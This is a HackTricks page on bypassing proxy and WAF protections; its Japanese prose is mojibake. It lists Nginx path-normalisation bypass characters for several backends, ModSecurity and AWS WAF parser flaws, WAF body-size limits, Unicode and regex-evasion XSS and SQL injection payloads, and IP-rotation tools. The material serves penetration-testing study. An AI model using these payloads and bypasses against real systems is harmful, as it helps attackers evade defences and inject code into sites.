# Proxy / WAF Protections Bypass

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## ãƒ‘ã‚¹åæ“ä½œã«ã‚ˆã‚‹Nginx ACLãƒ«ãƒ¼ãƒ«ã®ãƒã‚¤ãƒ‘ã‚¹ <a href="#heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules" id="heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules"></a>

ã“ã®ç ”ç©¶ã‹ã‚‰ã®æŠ€è¡“ [from this research](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)ã€‚

Nginxãƒ«ãƒ¼ãƒ«ã®ä¾‹ï¼š
```plaintext
location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
```
Nginxã¯ã€ãƒã‚¤ãƒ‘ã‚¹ã‚’é˜²ããŸã‚ã«ãƒã‚§ãƒƒã‚¯ã™ã‚‹å‰ã«ãƒ‘ã‚¹ã®æ­£è¦åŒ–ã‚’è¡Œã„ã¾ã™ã€‚ã—ã‹ã—ã€ãƒãƒƒã‚¯ã‚¨ãƒ³ãƒ‰ã‚µãƒ¼ãƒãƒ¼ãŒç•°ãªã‚‹æ­£è¦åŒ–ï¼ˆnginxãŒå‰Šé™¤ã—ãªã„æ–‡å­—ã‚’å‰Šé™¤ã™ã‚‹ï¼‰ã‚’è¡Œã†å ´åˆã€ã“ã®é˜²å¾¡ã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚

### **NodeJS - Express**

| Nginx Version | **Node.js Bypass Characters** |
| ------------- | ----------------------------- |
| 1.22.0        | `\xA0`                        |
| 1.21.6        | `\xA0`                        |
| 1.20.2        | `\xA0`, `\x09`, `\x0C`        |
| 1.18.0        | `\xA0`, `\x09`, `\x0C`        |
| 1.16.1        | `\xA0`, `\x09`, `\x0C`        |

### **Flask**

| Nginx Version | **Flask Bypass Characters**                                    |
| ------------- | -------------------------------------------------------------- |
| 1.22.0        | `\x85`, `\xA0`                                                 |
| 1.21.6        | `\x85`, `\xA0`                                                 |
| 1.20.2        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.18.0        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.16.1        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |

### **Spring Boot**

| Nginx Version | **Spring Boot Bypass Characters** |
| ------------- | --------------------------------- |
| 1.22.0        | `;`                               |
| 1.21.6        | `;`                               |
| 1.20.2        | `\x09`, `;`                       |
| 1.18.0        | `\x09`, `;`                       |
| 1.16.1        | `\x09`, `;`                       |

### **PHP-FPM**

Nginx FPMæ§‹æˆ:
```plaintext
location = /admin.php {
deny all;
}

location ~ \.php$ {
include snippets/fastcgi-php.conf;
fastcgi_pass unix:/run/php/php8.1-fpm.sock;
}
```
Nginxã¯`/admin.php`ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã‚’ãƒ–ãƒ­ãƒƒã‚¯ã™ã‚‹ã‚ˆã†ã«è¨­å®šã•ã‚Œã¦ã„ã¾ã™ãŒã€`/admin.php/index.php`ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ã§ã“ã‚Œã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚

### äºˆé˜²æ–¹æ³•
```plaintext
location ~* ^/admin {
deny all;
}
```
## Mod Securityãƒ«ãƒ¼ãƒ«ã®ãƒã‚¤ãƒ‘ã‚¹ <a href="#heading-bypassing-aws-waf-acl" id="heading-bypassing-aws-waf-acl"></a>

### ãƒ‘ã‚¹ã®æ··ä¹±

[**ã“ã®æŠ•ç¨¿**](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/)ã§ã¯ã€ModSecurity v3ï¼ˆ3.0.12ã¾ã§ï¼‰ãŒã€ã‚¢ã‚¯ã‚»ã‚¹ã•ã‚ŒãŸãƒ‘ã‚¹ã‚’å«ã‚€ã¯ãšã®`REQUEST_FILENAME`å¤‰æ•°ã‚’**ä¸é©åˆ‡ã«å®Ÿè£…ã—ã¦ã„ãŸ**ã“ã¨ãŒèª¬æ˜ã•ã‚Œã¦ã„ã¾ã™ï¼ˆãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã®é–‹å§‹ã¾ã§ï¼‰ã€‚ã“ã‚Œã¯ã€ãƒ‘ã‚¹ã‚’å–å¾—ã™ã‚‹ãŸã‚ã«URLãƒ‡ã‚³ãƒ¼ãƒ‰ã‚’è¡Œã£ãŸãŸã‚ã§ã™ã€‚\
ã—ãŸãŒã£ã¦ã€mod securityã§ã¯`http://example.com/foo%3f';alert(1);foo=`ã®ã‚ˆã†ãªãƒªã‚¯ã‚¨ã‚¹ãƒˆã¯ã€`%3f`ãŒ`?`ã«å¤‰æ›ã•ã‚Œã¦URLãƒ‘ã‚¹ãŒçµ‚äº†ã™ã‚‹ãŸã‚ã€ãƒ‘ã‚¹ã¯å˜ã«`/foo`ã§ã‚ã‚‹ã¨è€ƒãˆã¾ã™ãŒã€å®Ÿéš›ã«ã‚µãƒ¼ãƒãƒ¼ãŒå—ã‘å–ã‚‹ãƒ‘ã‚¹ã¯`/foo%3f';alert(1);foo=`ã«ãªã‚Šã¾ã™ã€‚

`REQUEST_BASENAME`ãŠã‚ˆã³`PATH_INFO`å¤‰æ•°ã‚‚ã“ã®ãƒã‚°ã®å½±éŸ¿ã‚’å—ã‘ã¾ã—ãŸã€‚

Mod Securityã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³2ã§ã‚‚åŒæ§˜ã®ã“ã¨ãŒç™ºç”Ÿã—ã€ç‰¹å®šã®æ‹¡å¼µå­ã«é–¢é€£ã™ã‚‹ãƒãƒƒã‚¯ã‚¢ãƒƒãƒ—ãƒ•ã‚¡ã‚¤ãƒ«ï¼ˆä¾‹ãˆã°`.bak`ï¼‰ã¸ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚¢ã‚¯ã‚»ã‚¹ã‚’é˜²ãä¿è­·ã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã—ãŸã€‚ã“ã‚Œã¯ã€ãƒ‰ãƒƒãƒˆã‚’`%2e`ã§URLã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã—ã¦é€ä¿¡ã™ã‚‹ã“ã¨ã§å®Ÿç¾ã•ã‚Œã¾ã—ãŸã€‚ä¾‹ãˆã°ï¼š`https://example.com/backup%2ebak`ã€‚

## AWS WAF ACLã®ãƒã‚¤ãƒ‘ã‚¹ <a href="#heading-bypassing-aws-waf-acl" id="heading-bypassing-aws-waf-acl"></a>

### ä¸æ­£ãªãƒ˜ãƒƒãƒ€ãƒ¼

[ã“ã®ç ”ç©¶](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)ã§ã¯ã€AWSãŒé©ç”¨ã—ãŸHTTPãƒ˜ãƒƒãƒ€ãƒ¼ã«å¯¾ã™ã‚‹WAFãƒ«ãƒ¼ãƒ«ã‚’ã€ä¸æ­£ã«è§£æã•ã‚ŒãŸãƒ˜ãƒƒãƒ€ãƒ¼ã‚’é€ä¿¡ã™ã‚‹ã“ã¨ã§ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã‚ã£ãŸã¨è¿°ã¹ã¦ã„ã¾ã™ã€‚ã“ã®ãƒ˜ãƒƒãƒ€ãƒ¼ã¯AWSã«ã‚ˆã£ã¦é©åˆ‡ã«è§£æã•ã‚Œã¾ã›ã‚“ã§ã—ãŸãŒã€ãƒãƒƒã‚¯ã‚¨ãƒ³ãƒ‰ã‚µãƒ¼ãƒãƒ¼ã«ã‚ˆã£ã¦ã¯è§£æã•ã‚Œã¾ã—ãŸã€‚

ä¾‹ãˆã°ã€ãƒ˜ãƒƒãƒ€ãƒ¼X-Queryã«SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã‚’å«ã‚€ä»¥ä¸‹ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹ã“ã¨ã§ã™ï¼š
```http
GET / HTTP/1.1\r\n
Host: target.com\r\n
X-Query: Value\r\n
\t' or '1'='1' -- \r\n
Connection: close\r\n
\r\n
```
AWS WAFã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã ã£ãŸã®ã¯ã€æ¬¡ã®è¡ŒãŒãƒ˜ãƒƒãƒ€ãƒ¼ã®å€¤ã®ä¸€éƒ¨ã§ã‚ã‚‹ã“ã¨ã‚’ç†è§£ã§ããªã‹ã£ãŸã‹ã‚‰ã§ã‚ã‚Šã€NODEJSã‚µãƒ¼ãƒãƒ¼ã¯ç†è§£ã—ã¦ã„ãŸï¼ˆã“ã‚Œã¯ä¿®æ­£ã•ã‚ŒãŸï¼‰ã€‚

## ä¸€èˆ¬çš„ãªWAFãƒã‚¤ãƒ‘ã‚¹

### ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚µã‚¤ã‚ºåˆ¶é™

ä¸€èˆ¬çš„ã«WAFã¯ã€ãƒã‚§ãƒƒã‚¯ã™ã‚‹ãƒªã‚¯ã‚¨ã‚¹ãƒˆã®é•·ã•åˆ¶é™ãŒã‚ã‚Šã€POST/PUT/PATCHãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒãã‚Œã‚’è¶…ãˆã‚‹ã¨ã€WAFã¯ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ãƒã‚§ãƒƒã‚¯ã—ã¾ã›ã‚“ã€‚

* AWS WAFã«ã¤ã„ã¦ã¯ã€[**ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã‚’ç¢ºèªã§ãã¾ã™**](https://docs.aws.amazon.com/waf/latest/developerguide/limits.html)**:**

<table data-header-hidden><thead><tr><th width="687"></th><th></th></tr></thead><tbody><tr><td>ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãƒ­ãƒ¼ãƒ‰ãƒãƒ©ãƒ³ã‚µãƒ¼ãŠã‚ˆã³AWS AppSyncä¿è­·ã®ãŸã‚ã«æ¤œæŸ»ã§ãã‚‹ã‚¦ã‚§ãƒ–ãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒœãƒ‡ã‚£ã®æœ€å¤§ã‚µã‚¤ã‚º</td><td>8 KB</td></tr><tr><td>CloudFrontã€API Gatewayã€Amazon Cognitoã€App Runnerã€ãŠã‚ˆã³Verified Accessä¿è­·ã®ãŸã‚ã«æ¤œæŸ»ã§ãã‚‹ã‚¦ã‚§ãƒ–ãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒœãƒ‡ã‚£ã®æœ€å¤§ã‚µã‚¤ã‚º**</td><td>64 KB</td></tr></tbody></table>

* [**Azureã®ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã‹ã‚‰**](https://learn.microsoft.com/en-us/azure/web-application-firewall/ag/application-gateway-waf-request-size-limits)**:**

Core Rule Set 3.1ï¼ˆã¾ãŸã¯ãã‚Œä»¥ä¸‹ï¼‰ã®å¤ã„Webã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãƒ•ã‚¡ã‚¤ã‚¢ã‚¦ã‚©ãƒ¼ãƒ«ã¯ã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒœãƒ‡ã‚£ã®æ¤œæŸ»ã‚’ã‚ªãƒ•ã«ã™ã‚‹ã“ã¨ã§**128 KB**ã‚’è¶…ãˆã‚‹ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’è¨±å¯ã—ã¾ã™ãŒã€ã“ã‚Œã‚‰ã®ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã¯è„†å¼±æ€§ã®ãƒã‚§ãƒƒã‚¯ã‚’å—ã‘ã¾ã›ã‚“ã€‚æ–°ã—ã„ãƒãƒ¼ã‚¸ãƒ§ãƒ³ï¼ˆCore Rule Set 3.2ä»¥é™ï¼‰ã§ã¯ã€æœ€å¤§ãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒœãƒ‡ã‚£åˆ¶é™ã‚’ç„¡åŠ¹ã«ã™ã‚‹ã“ã¨ã§åŒæ§˜ã®ã“ã¨ãŒã§ãã¾ã™ã€‚ãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒã‚µã‚¤ã‚ºåˆ¶é™ã‚’è¶…ãˆã‚‹ã¨ï¼š

**é˜²æ­¢ãƒ¢ãƒ¼ãƒ‰**ã®å ´åˆï¼šãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ãƒ­ã‚°ã«è¨˜éŒ²ã—ã€ãƒ–ãƒ­ãƒƒã‚¯ã—ã¾ã™ã€‚\
**æ¤œå‡ºãƒ¢ãƒ¼ãƒ‰**ã®å ´åˆï¼šåˆ¶é™ã¾ã§æ¤œæŸ»ã—ã€æ®‹ã‚Šã‚’ç„¡è¦–ã—ã€`Content-Length`ãŒåˆ¶é™ã‚’è¶…ãˆãŸå ´åˆã¯ãƒ­ã‚°ã«è¨˜éŒ²ã—ã¾ã™ã€‚

* [**Akamaiã‹ã‚‰**](https://community.akamai.com/customers/s/article/Can-WAF-inspect-all-arguments-and-values-in-request-body?language=en_US)**:**

ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€WAFã¯ãƒªã‚¯ã‚¨ã‚¹ãƒˆã®æœ€åˆã®8KBã®ã¿ã‚’æ¤œæŸ»ã—ã¾ã™ã€‚é«˜åº¦ãªãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã‚’è¿½åŠ ã™ã‚‹ã“ã¨ã§ã€åˆ¶é™ã‚’128KBã¾ã§å¼•ãä¸Šã’ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

* [**Cloudflareã‹ã‚‰**](https://developers.cloudflare.com/ruleset-engine/rules-language/fields/#http-request-body-fields)**:**

æœ€å¤§128KBã€‚

### é›£èª­åŒ– <a href="#obfuscation" id="obfuscation"></a>
```bash
# IIS, ASP Clasic
<%s%cr%u0131pt> == <script>

# Path blacklist bypass - Tomcat
/path1/path2/ == ;/path1;foo/path2;bar/;
```
### Unicode äº’æ›æ€§ <a href="#unicode-compatability" id="unicode-compatability"></a>

Unicode æ­£è¦åŒ–ã®å®Ÿè£…ã«ã‚ˆã£ã¦ï¼ˆè©³ç´°ã¯[ã“ã¡ã‚‰](https://jlajara.gitlab.io/Bypass\_WAF\_Unicode)ï¼‰ã€Unicode äº’æ›æ€§ã‚’å…±æœ‰ã™ã‚‹æ–‡å­—ã¯ WAF ã‚’ãƒã‚¤ãƒ‘ã‚¹ã—ã€æ„å›³ã—ãŸãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã¨ã—ã¦å®Ÿè¡Œã§ãã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ã€‚äº’æ›æ€§ã®ã‚ã‚‹æ–‡å­—ã¯[ã“ã¡ã‚‰](https://www.compart.com/en/unicode)ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

#### ä¾‹ <a href="#example" id="example"></a>
```bash
# under the NFKD normalization algorithm, the characters on the left translate
# to the XSS payload on the right
ï¼œimg srcâ¼p onerrorâ¼ï¼‡promptâ½1â¾ï¼‡ï¹¥  --> ï¼œimg src=p onerror='prompt(1)'>
```
### H2C Smuggling <a href="#ip-rotation" id="ip-rotation"></a>

{% content-ref url="h2c-smuggling.md" %}
[h2c-smuggling.md](h2c-smuggling.md)
{% endcontent-ref %}

### IP Rotation <a href="#ip-rotation" id="ip-rotation"></a>

* [https://github.com/ustayready/fireprox](https://github.com/ustayready/fireprox): ffufã¨ä¸€ç·’ã«ä½¿ç”¨ã™ã‚‹ãŸã‚ã®APIã‚²ãƒ¼ãƒˆã‚¦ã‚§ã‚¤URLã‚’ç”Ÿæˆã—ã¾ã™
* [https://github.com/rootcathacking/catspin](https://github.com/rootcathacking/catspin): fireproxã«ä¼¼ã¦ã„ã¾ã™
* [https://github.com/PortSwigger/ip-rotate](https://github.com/PortSwigger/ip-rotate): APIã‚²ãƒ¼ãƒˆã‚¦ã‚§ã‚¤IPã‚’ä½¿ç”¨ã™ã‚‹Burp Suiteãƒ—ãƒ©ã‚°ã‚¤ãƒ³
* [https://github.com/fyoorer/ShadowClone](https://github.com/fyoorer/ShadowClone): å…¥åŠ›ãƒ•ã‚¡ã‚¤ãƒ«ã‚µã‚¤ã‚ºã¨åˆ†å‰²ä¿‚æ•°ã«åŸºã¥ã„ã¦å‹•çš„ã«æ±ºå®šã•ã‚ŒãŸæ•°ã®ã‚³ãƒ³ãƒ†ãƒŠã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ãŒã‚¢ã‚¯ãƒ†ã‚£ãƒ–åŒ–ã•ã‚Œã€å…¥åŠ›ã¯ä¸¦åˆ—å®Ÿè¡Œã®ãŸã‚ã«ãƒãƒ£ãƒ³ã‚¯ã«åˆ†å‰²ã•ã‚Œã¾ã™ã€‚ä¾‹ãˆã°ã€100è¡Œã®åˆ†å‰²ä¿‚æ•°ã‚’æŒã¤10,000è¡Œã®å…¥åŠ›ãƒ•ã‚¡ã‚¤ãƒ«ã‹ã‚‰100ãƒãƒ£ãƒ³ã‚¯ã‚’å‡¦ç†ã™ã‚‹100ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ãªã©ã§ã™ã€‚

### Regex Bypasses

ãƒ•ã‚¡ã‚¤ã‚¢ã‚¦ã‚©ãƒ¼ãƒ«ã®regexãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ãŸã‚ã«ç•°ãªã‚‹æŠ€è¡“ãŒä½¿ç”¨ã§ãã¾ã™ã€‚ä¾‹ã¨ã—ã¦ã¯ã€ã‚±ãƒ¼ã‚¹ã®äº¤äº’ã€æ”¹è¡Œã®è¿½åŠ ã€ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã®ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ãªã©ãŒã‚ã‚Šã¾ã™ã€‚ã•ã¾ã–ã¾ãªãƒã‚¤ãƒ‘ã‚¹ã®ãƒªã‚½ãƒ¼ã‚¹ã¯[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#filter-bypass-and-exotic-payloads)ã‚„[OWASP](https://cheatsheetseries.owasp.org/cheatsheets/XSS\_Filter\_Evasion\_Cheat\_Sheet.html)ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ä»¥ä¸‹ã®ä¾‹ã¯[ã“ã®è¨˜äº‹](https://medium.com/@allypetitt/5-ways-i-bypassed-your-web-application-firewall-waf-43852a43a1c2)ã‹ã‚‰å¼•ç”¨ã•ã‚Œã¾ã—ãŸã€‚
```bash
<sCrIpT>alert(XSS)</sCriPt> #changing the case of the tag
<<script>alert(XSS)</script> #prepending an additional "<"
<script>alert(XSS) // #removing the closing tag
<script>alert`XSS`</script> #using backticks instead of parenetheses
java%0ascript:alert(1) #using encoded newline characters
<iframe src=http://malicous.com < #double open angle brackets
<STYLE>.classname{background-image:url("javascript:alert(XSS)");}</STYLE> #uncommon tags
<img/src=1/onerror=alert(0)> #bypass space filter by using / where a space is expected
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=javascript:alert(1)>xss</a> #extra characters
Function("ale"+"rt(1)")(); #using uncommon functions besides alert, console.log, and prompt
javascript:74163166147401571561541571411447514115414516216450615176 #octal encoding
<iframe src="javascript:alert(`xss`)"> #unicode encoding
/?id=1+un/**/ion+sel/**/ect+1,2,3-- #using comments in SQL query to break up statement
new Function`alt\`6\``; #using backticks instead of parentheses
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ #base64 encoding the javascript
%26%2397;lert(1) #using HTML encoding
<a src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(XSS)"> #Using Line Feed (LF) line breaks
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm()> # use any chars that aren't letters, numbers, or encapsulation chars between event handler and equal sign (only works on Gecko engine)
```
## Tools

* [**nowafpls**](https://github.com/assetnote/nowafpls): WAFã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ãŸã‚ã«ãƒªã‚¯ã‚¨ã‚¹ãƒˆã«ã‚¸ãƒ£ãƒ³ã‚¯ãƒ‡ãƒ¼ã‚¿ã‚’è¿½åŠ ã™ã‚‹Burpãƒ—ãƒ©ã‚°ã‚¤ãƒ³

## References

* [https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)
* [https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/)
* [https://www.youtube.com/watch?v=0OMmWtU2Y\_g](https://www.youtube.com/watch?v=0OMmWtU2Y\_g)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€ç·´ç¿’ã™ã‚‹:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€ç·´ç¿’ã™ã‚‹: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®githubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
